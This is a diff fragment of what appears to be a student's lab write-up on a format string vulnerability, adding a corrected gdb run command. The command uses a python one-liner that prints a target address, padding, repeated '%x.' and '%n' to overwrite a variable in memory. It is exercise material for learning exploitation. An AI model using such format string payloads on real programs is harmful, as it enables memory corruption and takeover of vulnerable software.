@@ -113,6 +113,11 @@ AAAABB4020e000.0.4006920b.4020e3fc.0.bffff378.80484e7.bffff580.bffff424.bffff430
 ```
     run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
 ```
+Note: when I re-run this my command was this:
+```
+run `(python -c 'print "\x28\xa0\x04\x08"+"BB" + "%x." * 143+"%n"')`
+```
+
 Output:![Alt text](image-9.png)
 14. Extra: see the value of target changing
 - add break at line 5
